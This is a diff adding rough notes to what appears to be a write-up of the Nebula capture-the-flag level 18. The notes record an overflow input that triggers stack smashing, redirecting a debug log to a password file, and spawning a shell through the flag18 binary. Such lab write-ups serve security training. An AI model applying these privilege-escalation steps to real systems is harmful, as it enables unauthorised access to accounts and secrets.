@@ -193,3 +193,19 @@ How about we set our debug log file to `/home/flag18/password`?
 ```console
 setuser aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ```
+
+Recieve a stack smashing error
+
+
+What if we run them together?
+```console
+level18@nebula:/home/flag18$ ./flag18 -d password
+site exec love
+```
+```console
+level18@nebula:/home/flag18$ ./flag18 -d password -d test -vvv
+```
+```console
+level18@nebula:/home/flag18$ ./flag18 -c $SHELL
+```
+First win, what about the other wins?
